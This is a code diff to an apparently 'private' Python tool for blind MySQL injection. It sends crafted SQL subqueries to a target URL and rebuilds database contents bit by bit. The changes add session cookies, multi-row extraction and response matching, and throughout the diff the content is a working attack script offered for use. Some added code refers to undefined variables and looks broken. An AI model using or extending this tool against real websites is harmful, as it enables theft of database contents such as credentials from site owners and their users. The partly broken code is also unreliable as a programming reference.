@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 #
 #########################################################
 # PRIV8 - PRIV8 - PRIV8 - PRIV8 - PRIV8 - PRIV8 - PRIV8 #
@@ -33,17 +33,32 @@ hashes = []
 
 def pwn(injection):
        
+    global cookie
+    global cookies
+    if cookies == {} :
+        if cookie:
+            cookie = cookie.split('=') or cookie
+            if not len(cookie) % 2:
+                for i in range(0, len(cookie), 2):
+                     cookies[cookie[i]] = cookie[i+1]
+            else:
+                sys.stdout.write('[x] Malformed cookie.\n')
+                exit()
+    
     url = target + injection
+    url = url.replace('+', '%2b')
     url = url.replace(' ', '+')
-    r = requests.get(url)
+    r = requests.get(url, cookies=cookies)
     data = r.text
     
-    #sys.stdout.write("%s\n" % (url))
         
     global request
     request += 0x01
  
-    return hashlib.md5(data.encode('utf-8')).hexdigest()
+    if use_hashes:
+        return hashlib.md5(data.encode('utf-8')).hexdigest()
+    else:
+        return data.encode('utf-8')
 
 def get_hashes():
   
@@ -72,13 +87,14 @@ def get_length():
     binlen = '00000000'
     
     global hashes
+    global row
     size_limit = 0x00
     sizes = [0xff, 0xffff, 0xffffff, 0xffffffff, 0xffffffffffffffff ]
     c = 0x0
     
     while 0x01:
     
-        inj_length = "((SELECT LENGTH(%s)FROM %s LIMIT/*LESS*/%d,1)>%d)" % (field, table, row, sizes[c])
+        inj_length = "((SELECT LENGTH(%s)FROM %s LIMIT %d,1)>%d)" % (field, table, row, sizes[c])
         res_length = pwn(inj_length)
         
         #sys.stdout.write("%s\n" % (inj_length))
@@ -91,16 +107,25 @@ def get_length():
     size = sizes[c - 0x01] + 0x01
     limit = size >> (0x05 * c)
     
-    sys.stdout.write("[+] Calculating length: ")
+    sys.stdout.write("\n\n[+] Calculating length: ")
     sys.stdout.flush()
     
     binlen = ''
     
     for binindex in range(0x01, limit + 0x01, 0x03 ):
        
-        injection = "(SELECT CONV(MID(LPAD(BIN(LENGTH(%s)),%d,'0'),%d,3),2,10)FROM %s LIMIT/*LESS*/%d,1)" % (field, limit, binindex, table, row) 
-        result = pwn(injection)    
+        injection = "(SELECT CONV(MID(LPAD(BIN(LENGTH(%s)),%d,'0'),%d,3),2,10)FROM %s LIMIT %d,1)" % (field, limit, binindex, table, row) 
+        result = pwn(injection)
         
+        if not use_hashes:
+            while 1:
+                if bytes(true_string, 'utf-8') in result:
+                    number.append('1')
+                elif bytes(false_string, 'utf-8') in result:
+                    number.append('0')
+                else:
+                    return int(''.join(number), 0x02)
+
         hid = 0x00
 
         while hid < len(hashes):
@@ -149,89 +174,106 @@ def get_length():
 
 def inject(charindex, binindex):
 
-        injection = "(SELECT CONV(MID(LPAD(BIN(ASCII(MID(%s,%d,1))),8,'0'),%d,3),2,10)FROM %s LIMIT/*LESS*/%d,1)" % (field, charindex, binindex, table, row) 
-        result = pwn(injection)
-        
-        global binstr
-        
-        global hashes
-        hid = 0x00
-        while hid < len(hashes):
+        global row
+        while 1:
+            injection = "(SELECT CONV(MID(LPAD(BIN(ASCII(MID(%s,%d,1))),8,'0'),%d,3),2,10)FROM %s LIMIT %d,1)" % (field, charindex, binindex, table, row) 
+            result = pwn(injection)
             
-            if hashes[hid] in result:
-                
-                if binindex == 0x07:
-                    b = 0x01
+            global binstr
+            global hashes
+            
+            if not use_hashes:
+                if bytes(true_string, 'utf-8') in result:
+                    bitstring.append('1')
+                elif bytes(false_string, 'utf-8') in result:
+                    bitstring.append('0')
                 else:
-                    b = 0x0
+                    r[index] = string[int(''.join(bitstring), 0x02) - 0x01]
+                    return 1
 
-                if hid == 0x00:
-                    bit = '000'[b:]
-                elif hid == 0x01:
-                    bit = '001'[b:]
-                elif hid == 0x02:
-                    bit = '010'[b:]
-                elif hid == 0x03:
-                    bit = '011'[b:]
-                elif hid == 0x04:
-                    bit = '100'[b:]
-                elif hid == 0x05:
-                    bit = '101'[b:]
-                elif hid == 0x06:
-                    bit = '110'[b:]
-                elif hid == 0x07:
-                    bit = '111'[b:]
-                else:
-                    sys.stdout.write("Invalid response\n")
-                    exit()
 
-                binstr = binstr[ : binindex - 0x01] + bit + binstr[ binindex + 0x02: ]
-                break
+
+
+            hid = 0x00
+            while hid < len(hashes):
                 
-            hid += 0x01
+                if hashes[hid] in result:
+                    
+                    if binindex == 0x07:
+                        b = 0x01
+                    else:
+                        b = 0x0
+
+                    if hid == 0x00:
+                        bit = '000'[b:]
+                    elif hid == 0x01:
+                        bit = '001'[b:]
+                    elif hid == 0x02:
+                        bit = '010'[b:]
+                    elif hid == 0x03:
+                        bit = '011'[b:]
+                    elif hid == 0x04:
+                        bit = '100'[b:]
+                    elif hid == 0x05:
+                        bit = '101'[b:]
+                    elif hid == 0x06:
+                        bit = '110'[b:]
+                    elif hid == 0x07:
+                        bit = '111'[b:]
+                    else:
+                        sys.stdout.write("Invalid response\n")
+                        exit()
+
+                    binstr = binstr[ : binindex - 0x01] + bit + binstr[ binindex + 0x02: ]
+                    break
+                    
+                hid += 0x01
+            return 1
                         
 def start():
 
     global hashes
+    global row
+    global number_of_rows
     hashes = get_hashes()
 
-    index = 0x01
-    length = get_length()
-    #length = 32
     request = 0x00
 
     sys.stdout.write("-" * 0x45 + "\n\n" )  
 
-    sys.stdout.write("[+] Found: ")
+    while row < number_of_rows:
+        index = 0x01
+        length = get_length()
+        sys.stdout.write("\n[+] Found: ")
 
-    while index <= length:
+        while index <= length:
 
-        global binstr
-        binstr = '00000000'
+            global binstr
+            binstr = '00000000'
 
+            
+            t1 = threading.Thread(target = inject, args = (index, 0x1))
+            t2 = threading.Thread(target = inject, args = (index, 0x4))
+            t3 = threading.Thread(target = inject, args = (index, 0x7))        
+
+            t1.start()
+            t2.start()
+            t3.start()
+            
+            t1.join()
+            t2.join()
+            t3.join()
+
+            sys.stdout.write("%s" % (chr(int(binstr, 0x02))) )    
+            sys.stdout.flush()
+
+            index  +=  0x01
+        row += 0x01
         
-        t1 = threading.Thread(target = inject, args = (index, 0x1))
-        t2 = threading.Thread(target = inject, args = (index, 0x4))
-        t3 = threading.Thread(target = inject, args = (index, 0x7))        
-
-        t1.start()
-        t2.start()
-        t3.start()
-        
-        t1.join()
-        t2.join()
-        t3.join()
-
-        sys.stdout.write("%s" % (chr(int(binstr, 0x02))) )    
-        sys.stdout.flush()
-
-        index  +=  0x01
-    
     return 0x01
 
 
-parser = argparse.ArgumentParser(description="Blind MySQL Injection data extraction through bit-anding by tr3w.")
-#parser.add_argument('-f','--falseid',     default = 0,    type=int,
+parser = argparse.ArgumentParser(description="Fast Blind MySQL Injection data extraction by tr3w.")
 #            help = 'id of the page when result is false (default: %(default)')
 parser.add_argument('-i','--ids',    default = '0,1,2,3,4,5,6,7',    type=str,
         help = 'IDs of 8 consecutive different pages separated by commas (default: %(default)s)')
@@ -241,6 +283,10 @@ parser.add_argument('-t','--table',    default = "information_schema.tables",
         help = 'Table name from where to extract data (default: %(default)s)')
 parser.add_argument('-r','--row', default = 0, type=int,
         help = 'Row number to extract, default: 0')
+parser.add_argument('-m', '--number_of_rows', default = 1, type=int,
+        help = 'Number of rows to extract. (default: %(default)s)')
+parser.add_argument('-k', '--cookie', default = '', type=str,
+        help = "Session cookie")
 parser.add_argument('TARGET', help='The vulnerable URL. Example: http://vuln.com/page.php?id= ')
 args = parser.parse_args()
 
@@ -249,11 +295,18 @@ field    = args.column
 table    = args.table
 row = args.row
 target    = args.TARGET
+use_hashes = 1
+number_of_rows = args.number_of_rows + row
+
+cookies = {}
+cookie = args.cookie or ''
+
 
 timer =  time.strftime("%X")
 start()
-sys.stdout.write("\n\n[+] Start Time: " + timer)
+sys.stdout.write("\n\n[+] Start Time: %s " % timer)
 sys.stdout.write("\n[+] End Time:   " + time.strftime("%X"))
+
 sys.stdout.write("\n[+] %d requests\n" % (request))
 sys.stdout.write("\n[+] Done.\n")
-    
+ 
